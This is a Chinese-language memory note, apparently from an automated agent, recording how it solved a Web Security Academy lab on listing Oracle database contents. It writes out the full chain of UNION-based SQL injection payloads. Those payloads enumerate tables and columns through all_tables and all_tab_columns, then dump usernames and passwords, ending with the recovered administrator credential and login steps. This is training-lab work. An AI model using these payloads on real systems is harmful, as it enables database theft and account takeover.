---
metadata:
  node_type: memory
name: "PRS arm A lab-listing-database-contents-oracle"
description: "arm A 基线:lab-listing-database-contents-oracle 冷实例一次通过 - all_tables 列出 USERS_QOLSOU,all_tab_columns 得 USERNAME_YTQQMA/PASSWORD_JEDWGV,登录 administrator 后 banner solved"
last_updated: 2026-10-09T05:24:49+08:00
created: 2026-10-09T05:24:49+08:00
---

## 结论

arm A 基线:lab-listing-database-contents-oracle 冷实例(reused:false)一次通过,四次注入 + 一次登录到 congrats。

实例:https://0a7c00cc049accb2835a787b00140092.web-security-academy.net/

## 链条

1. `range_launch launch-url <lab 路径> --jar /tmp/cj1.json` → instance_url 直接可用,reused:false。
2. 列数/回显列:`/filter?category=Gifts' UNION SELECT 'a',NULL FROM dual--` → 两列,第 1 列回显。
3. 表名:`UNION SELECT table_name,NULL FROM all_tables` → 命中自制表 `USERS_QOLSOU`(其余为 Oracle 自带数据字典表,一次全量回显足够,未加分页/过滤)。
4. 列名:`UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_QOLSOU'` → `USERNAME_YTQQMA` / `PASSWORD_JEDWGV` / `EMAIL`。
5. 凭据:`UNION SELECT USERNAME_YTQQMA||'~'||PASSWORD_JEDWGV,NULL FROM USERS_QOLSOU` → administrator~c4l9koh772xmj77175jo(另有 carlos/wiener)。
6. 登录:GET /login 取 csrf → POST /login(csrf/username/password)→ 302 /my-account?id=administrator,Set-Cookie 换新 session。
7. `banner_verdict` 判 solved:true(congrats 行)。

## 坑与观察

- Oracle 分支的表名/列名都是大写后缀随机化,靠 all_tables / all_tab_columns 动态读,不能猜。
- http_session 信封带 `script_blocks_stripped:1`,但 filter 页面无 script 依赖,不影响判读;反射槽为空时才需换 raw_http/page_alert 佐证。
- 登录响应 body_saved_len 是 follow 后终页长度;302 与新 cookie 在 hops[0]。
- lab 判定点就是"以 administrator 登录",登录成功即 congrats;首页横幅此前为 Not solved(未发生停滞问题)。

